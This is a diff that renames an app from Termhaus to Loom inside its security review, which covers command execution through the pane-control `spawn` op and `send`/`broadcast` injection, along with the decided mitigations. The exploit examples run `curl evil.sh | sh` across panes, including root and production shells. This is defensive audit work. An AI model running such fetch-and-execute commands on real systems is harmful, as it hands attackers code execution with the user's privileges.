@@ -1,4 +1,4 @@
-# Security Review — Termhaus
+# Security Review — Loom
 
 > General whole-app security review (not a branch diff). Date: 2026-06-12.
 > Threat model: local desktop app where the WebKitGTK **webview** and any process
@@ -36,13 +36,13 @@ Status legend: `[ ]` todo · `[~]` in progress · `[x]` done · `[-]` won't fix 
 - **Description:** The `spawn` control op carries attacker-controlled `command` + `cwd`
   from any pane. Rust relays without attaching caller identity; TS never checks one. Any
   process in any pane gets full command execution as the app user, in any directory.
-- **Exploit:** Untrusted agent in a pane runs `th spawn --cwd $HOME -- bash -c 'curl evil.sh | sh'`
+- **Exploit:** Untrusted agent in a pane runs `loom spawn --cwd $HOME -- bash -c 'curl evil.sh | sh'`
   (or MCP `spawn_pane`) → new pane instantly runs the payload with the user's privileges.
 - **Decision (taken):** hybrid — accept the same-user trust model as baseline + gate the one
   silent-RCE op (`spawn`) behind confirmation. Full per-pane capability system deferred.
   - [x] Gate `spawn` behind a user confirmation prompt — `paneControl.ts` `spawn` dispatch,
-    new setting `confirmExternalSpawn` (default on, Settings → Behaviour). Covers both `th`
-    and `th-mcp` (shared relay → dispatch).
+    new setting `confirmExternalSpawn` (default on, Settings → Behaviour). Covers both `loom`
+    and `loom mcp` (shared relay → dispatch).
   - [x] Documented the trust model + the sharp edge in `docs/adr/0007-*.md` (new "Security model"
     section).
   - [ ] (Deferred / roadmap) Per-pane opt-in capability with caller identity from the relay —
@@ -57,7 +57,7 @@ Status legend: `[ ]` todo · `[~]` in progress · `[x]` done · `[-]` won't fix 
 - **Description:** `send`/`broadcast` write arbitrary text + trailing `\r` directly into
   another pane's PTY. If the target sits at a shell prompt, injected text executes there.
   Any pane can target any other pane (or broadcast to all) with no caller check.
-- **Exploit:** Agent in pane A runs `th broadcast 'curl evil.sh | sh'` → every other pane
+- **Exploit:** Agent in pane A runs `loom broadcast 'curl evil.sh | sh'` → every other pane
   (root shell, `ssh root@prod`, second agent) runs the line in its own context.
 - **Decision (taken):** ACCEPTED as baseline trust model, not gated. Rationale: `send`/`broadcast`
   type into a *visible* pane — the injected text and its output are on screen, so the blast radius
